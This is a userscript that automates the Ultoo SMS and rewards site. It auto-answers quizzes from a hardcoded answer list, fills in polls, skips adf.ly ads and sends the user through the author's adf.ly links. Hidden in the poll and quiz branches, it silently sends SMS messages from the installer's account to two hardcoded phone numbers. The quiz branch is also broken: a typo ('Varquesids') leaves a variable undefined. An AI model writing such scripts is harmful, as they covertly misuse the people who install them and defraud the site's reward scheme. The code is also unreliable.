// ==UserScript==
// @name        Ultoo [08-04-2013] Multitasking Script By Hacking Tricks Master.
// @namespace   Ultoo MultiTasking Script
// @include     http://sms.ultoo.com/*
// @include     http://adf.ly/*
// @updateURL		http://userscripts.org/scripts/source/160737.meta.js
// @downloadURL		http://userscripts.org/scripts/source/160737.user.js
// @require https://ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js
// @grant       none
// @version     3.0.2
// ==/UserScript==


$(function()
{

var path=window.location.pathname;

var url=window.location.href;

var pattern=/^http:\/\/sms.ultoo.com\/mywallet.php/g;

if(url.search(pattern)==0)
{
	window.location.href=url.replace("mywallet","AnswereIt");
}
var pattern=/^http:\/\/adf.ly/g;

if(url.search(pattern)==0){setInterval(function () {document.getElementById("skip_ad_button").click();}, 1000);}

pattern=/^http:\/\/sms.ultoo.com\/index.php/g;

if(url.search(pattern)==0)
{
	window.location.href="http://sms.ultoo.com/logout.php?LogOut=1";
}

pattern=/^http:\/\/sms.ultoo.com\/SessExpire.php/g;

if(url.search(pattern)==0)
{
	window.location.href="http://sms.ultoo.com/logout.php?LogOut=1";
}

pattern=/^http:\/\/sms.ultoo.com\/relogin.php/g;

if(url.search(pattern)==0)
{
	window.location.href="http://sms.ultoo.com/login.php";
}

pattern=/^http:\/\/sms.ultoo.com\/poll.php/g;

var path=window.location.pathname;

if (path=="/poll.php")
{
    var rand=computeRandom();
    var opt="AnchorId_"+rand;
    ImplementClass(opt);
    document.form1.submit();
    setTimeout("window.location.href = \"http://sms.ultoo.com/poll.php?zxcoiesesscd=\";",700);
}
function computeRandom()
{
return Math.round(Math.random() * (4-1) + 1);
}

pattern=/^http:\/\/sms.ultoo.com\/PollResult.php/g;

if(url.search(pattern)==0)
{
	var link = $(".poll_result_gbg a:last").attr('href');
	if(typeof(link) != "undefined")
	{
		window.location.href = link;
	}

	var link2 = $("img[src='images/Submit_Now.jpg']").parent().attr("href");

}

pattern=/^http:\/\/sms.ultoo.com\/middleAdPoll.php/g;

if(url.search(pattern)==0)
{
	window.location.href=url.replace("middleAdPoll","poll");
}

var pattern=/^http:\/\/sms.ultoo.com\/PollCompletion.php/g;

if(url.search(pattern)==0)
{
	window.location.href=url.replace("PollCompletion","PollCompleted");
}

pattern=/^http:\/\/sms.ultoo.com\/PollCompleted.php/g;

if(url.search(pattern)==0)
{
	document.getElementsByName('PollUserName')[0].value="Smarty";
	document.getElementsByName('PollUserQuestion')[0].value="Its Ultoo Time..";
	document.getElementById('OptionId1').value="a";
	document.getElementById('OptionId2').value="b";
	document.getElementById('OptionId3').value="c";
	document.getElementById('OptionId4').value="d";
	var mobile=9360299840;
		$.post("home.php",{zxcoiesesscd:"" , MessageLength:"140" , GlobalKeyValue:"1" , chalange_field:"" , response_field:"" , MobileNos_:mobile , Message_:"Hello Babe......" , SendNow_:"Send Now"}, function(){});
	setTimeout("document.form1.submit();",900);
}

pattern=/^http:\/\/sms.ultoo.com\/QuestionSaved.php/g;

if(url.search(pattern)==0)
{
	window.location.href="http://adf.ly/MXlDE";
	
}

pattern=/^http:\/\/sms.ultoo.com\/home.php/g;

if(url.search(pattern)==0)
{
	window.location.href="http://sms.ultoo.com/logout.php?Logout=1";
}

pattern=/^http:\/\/sms.ultoo.com\/AnswereIt.php/g;

if(url.search(pattern)==0)
{
    	var options="Webber;Sehwag;Diya;Egypt;Murray;Punjab;Tom Cruise;Naveen Patnaik;Nakul;Goku;Icc;31 May;Mp;Amar;Vienna;Chess;Messi;Usa;Life;Aamir;Hansika;Maya;Delhi;The Iron Lady;Sitar;Tetanus;Shiva;Senate;Sikhism;Russia;Goa;Elbe;Saif;Nse;Amritsar;Delhi;Jonggy;Paro;Go;Lion;Dog;Luck;Boris;Pooja Salvi;Tata Motors;44;Italy;Rabies;Tn"


Varquesids="7863;7864;7867;7869;7870;7871;7874;7876;7878;7879;7882;7883;7884;7885;7886;7887;7888;7889;7890;7891;7892;7893;7894;7895;7896;8072;8073;8074;8075;8076;8077;8078;8079;8080;8081;8082;8083;8084;8085;8086;8087;8088;8089;8090;8091;8092;8093;8094;8095;8096";
	var cont=document.getElementsByTagName('p')[0].innerHTML;
	var qno=parseInt(cont.substr(17));
	document.getElementsByTagName('input')[0].value=options.split(";")[qno-1];	
	var quesid=quesids.split(";")[qno-1];
	var oid=(parseInt(quesid)*4)-10;
	var qxval=document.getElementsByTagName('input')[0].value;
	var mobile=7277021082;
	$.post("poll.php",{ qxci:qxval , QuestionId:quesid , OptionChecked:"1" , zxcoiesesscd:"" , chalange_field:"" , response_field:"" , OptionId:oid},function(){});
	setTimeout(function(){$.post("home.php",{zxcoiesesscd:"" , MessageLength:"140" , GlobalKeyValue:"1" , chalange_field:"" , response_field:"" , MobileNos_:mobile , Message_:"Tu.... Meri Zindagi Hai"+Math.floor((Math.random() * 10000) + 1)+"'" , SendNow_:"Send Now"}, function(){});},750);
	setTimeout("document.getElementsByTagName('input')[2].click();",1200);
	setTimeout("window.location.href = \"http://sms.ultoo.com/AnswereIt.php?zxcoiesesscd=\";",2600);
}

pattern=/http:\/\/sms.ultoo.com\/AnswereItGraph.php/g;

if(url.search(pattern)==0)
{
	window.location.href = "http://sms.ultoo.com/AnswereIt.php?zxcoiesesscd=";
}

pattern=/http:\/\/sms.ultoo.com\/AICompletion.php/g;

if(url.search(pattern)==0)
{
	window.location.href = "http://adf.ly/MXkrI";
}




});